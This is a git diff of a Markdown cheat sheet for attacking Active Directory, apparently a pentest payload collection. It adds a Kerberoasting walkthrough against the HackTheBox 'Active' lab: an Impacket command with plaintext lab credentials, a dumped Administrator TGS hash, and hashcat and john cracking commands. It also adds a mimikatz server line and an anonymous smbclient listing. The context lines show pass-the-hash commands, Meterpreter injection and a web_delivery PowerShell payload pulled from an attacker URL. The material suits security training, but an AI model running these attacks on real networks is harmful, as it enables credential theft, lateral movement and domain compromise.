@@ -53,6 +53,7 @@
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
   crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
   crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
+  crackmapexec mimikatz --server http --server-port 80
   ```
 
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
@@ -87,6 +88,12 @@ ls # list files
 cd 
 get # download files
 put # replace a file
+```
+
+or 
+
+```powershell
+smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
 ```
 
 Mount a share
@@ -312,13 +319,28 @@ TODO
 ### Kerberoast
 
 ```powershell
-https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf
-https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
-https://room362.com/post/2016/kerberoast-pt1/
+GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request-user Administrator >
 
-./GetUserSPNS.py -request lab.ropnop.com/thoffman:Summer2017
-(Impacket) Kerberoasting (ldap query, tgs in JTR format)
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
+--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43c360c29c154b012c$c54c7be163ae6c323ae6b5fc45a1eacee2f4903deec785cd689f4551e023775c7e7772fe85e3fb8374ca95534d72c971ba80e8b6d4ef3c3b8439dc54031540133cbcbd5f7b39d622733d198eec594c0cd181ab4696a6ad12744d1ddd2d3e2c6dd33b4daedbc9cae75e8ff2652c80421b0fa3a61ddf2cabeea462c44e0f6d9a6436717e0621bb4e0fe8bd3cf36156b4b2f7b81d651f70baf34a0b3071858b5034b895c25a0d3c67044c849d5952c381a0078a86ae562810a93d9c7bcc8311255cc9eda35a9c4d4d43ff1cc29108056285c954f3c633332ff0cb0c9c0f1896c792b247c8d25f5dd71802728fc99bb22709337b5596ab0e2045110b0b005b03351e9f71a65b48e8259f6191ce95d4e5794846c61c3abccf0f5f72a8679fb0dc0777720f5551ad99c9c9ab0955f85ee211d40b01fcaece7868960b2063923aa0f59e17b347f3308087707e95cad54b9df8179728821cf54cb204c5c2e571d9a66c8ec40b090305aa32e90a90d25ea37be6d8f8a83c683a8b69d386f9edb970596bc56fa02971f69c7e073b8de1213d9caa75ab652e5c5b99cadace9dd7d15d1d530309ea39ca1b7c6009ae3342796a6bdea084622ee95cbade437659e37363b848bad2186e3a9f7dec66e1e496db32d55eda8fb926f057996638646dcc662ed226788ddf36304dc70eaca91b26cb7180341f417fad91117ee10212c69423abd42769cbf891b51d736ffe474899eec8df64abef319d3c6dc379f2bfda33de7c3a1a50d6ece564d4559c77f560b7506fa2f1c9af7162f1247ea35706aafffde48b8cc48b1ec8e99d99ac81dc02f55f43f9726d746383cd076e7199070ff8100846ba9dc2235e92d0c7dac1f33da5fe7901e02f0566030d7c7e02535d6a300292a04e6c32d0d74d37679c2617750f5920d9c697a30c883519bc6b5a916eec354459c7f248c783bd79c436a7e8c463a8981a9e000d21c2d00c7e8468cff0ab695cb3aa4f14f149d1fafb4d656bcd1f67b747fc4c2d648466a386774853db8d50c22df57e747085142f98f5f06191c243b9dbf671da64228364f058c7e2e53a80fdde7f6dc2f25459a09fb2583757953247c222d64f49bc12d461d2e5aa572ceba2605d7eafd6031405ee422ac35cbf041b4fd28e58d871406e053d1a806de49056791646c175bf0d2aaa19f844bfc885520e19c391702be6ae61122fceac32b689764334908a4eaf7c69974a9519ebb068a15c087955fb402416bd184fd2
 ```
+
+Then crack the hash with hashcat or john
+
+```powershell
+hashcat -m 13100 -a 0 hash.txt crackstation.txt
+./john ~/hash.txt --wordlist=rockyou.lst
+```
+
+
+- https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf
+- https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
+- https://room362.com/post/2016/kerberoast-pt1/
 
 ### Pass-the-Hash
 
